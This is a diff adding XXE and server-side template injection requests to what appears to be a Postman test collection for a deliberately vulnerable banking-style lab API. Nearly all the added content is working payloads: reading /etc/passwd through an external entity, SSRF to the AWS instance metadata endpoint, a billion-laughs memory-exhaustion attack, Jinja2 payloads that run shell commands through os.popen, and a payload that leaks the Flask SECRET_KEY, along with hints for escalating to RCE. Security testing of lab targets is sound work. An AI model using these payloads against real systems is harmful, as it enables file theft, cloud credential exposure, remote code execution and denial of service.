@@ -623,6 +623,94 @@
       ]
     },
     {
+      "name": "XXE Injection",
+      "item": [
+        {
+          "name": "XXE Parse — /etc/passwd Read",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/xml"}],
+            "url": {"raw": "{{base_url}}/api/xml/parse", "host": ["{{base_url}}"], "path": ["api", "xml", "parse"]},
+            "body": {
+              "mode": "raw",
+              "raw": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<account><balance>&xxe;</balance></account>"
+            },
+            "description": "CWE-611: XXE injection via /api/xml/parse. lxml parses XML with resolve_entities=True and no_network=False. External entity reads /etc/passwd via file:// URI. Observe: file contents reflected in parsed.balance field."
+          }
+        },
+        {
+          "name": "XXE Transfer — SSRF to AWS Metadata",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/xml"}],
+            "url": {"raw": "{{base_url}}/api/xml/transfer", "host": ["{{base_url}}"], "path": ["api", "xml", "transfer"]},
+            "body": {
+              "mode": "raw",
+              "raw": "<?xml version=\"1.0\"?>\n<!DOCTYPE transfer [\n  <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n]>\n<transfer><to>attacker</to><amount>&xxe;</amount><memo>test</memo></transfer>"
+            },
+            "description": "CWE-611 + CWE-918: XXE-based SSRF in /api/xml/transfer. External entity resolved via http:// to AWS instance metadata endpoint. Observe: EC2 metadata keys returned in the amount field of the JSON response."
+          }
+        },
+        {
+          "name": "XXE Statement — Billion Laughs DoS",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/xml"}],
+            "url": {"raw": "{{base_url}}/api/xml/statement", "host": ["{{base_url}}"], "path": ["api", "xml", "statement"]},
+            "body": {
+              "mode": "raw",
+              "raw": "<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n  <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n  <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n  <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n  <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n  <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n]>\n<statement>&lol9;</statement>"
+            },
+            "description": "CWE-400: Billion laughs DoS via exponential entity expansion in /api/xml/statement. huge_tree=True with no entity count limit. &lol9; expands to 10^9 'lol' strings causing memory exhaustion. Observe: server CPU/memory spike and eventual timeout or OOM."
+          }
+        }
+      ]
+    },
+    {
+      "name": "SSTI",
+      "item": [
+        {
+          "name": "SSTI Render Name — Expression Execution",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/template/render?name={{ 7*7 }}",
+              "host": ["{{base_url}}"],
+              "path": ["api", "template", "render"],
+              "query": [{"key": "name", "value": "{{ 7*7 }}"}]
+            },
+            "description": "CWE-94: SSTI in /api/template/render via GET param 'name'. User input is f-string interpolated before render_template_string — Jinja2 evaluates {{ 7*7 }} to 49. Observe: rendered field contains 'Hello, 49!'. Escalate to RCE with: {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"
+          }
+        },
+        {
+          "name": "SSTI Email Template — RCE via Globals",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/template/email", "host": ["{{base_url}}"], "path": ["api", "template", "email"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"template\": \"{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}\", \"context\": {\"user\": \"alice\"}}"
+            },
+            "description": "CWE-94: Full SSTI RCE in /api/template/email. Attacker controls the complete Jinja2 template string passed to render_template_string. Payload accesses os module via config globals to execute arbitrary shell commands. Observe: output of 'id' command returned in rendered field."
+          }
+        },
+        {
+          "name": "SSTI Invoice — account_id Injection",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/template/invoice?account_id={{ config.SECRET_KEY }}",
+              "host": ["{{base_url}}"],
+              "path": ["api", "template", "invoice"],
+              "query": [{"key": "account_id", "value": "{{ config.SECRET_KEY }}"}]
+            },
+            "description": "CWE-94 + CWE-200: SSTI via account_id in /api/template/invoice. account_id injected into invoice template string before Jinja2 rendering. Payload {{ config.SECRET_KEY }} leaks Flask secret key. Observe: SECRET_KEY value ('supersecretkey123') in invoice field. Escalate to RCE with subclasses payload."
+          }
+        }
+      ]
+    },
+    {
       "name": "File Upload",
       "item": [
         {
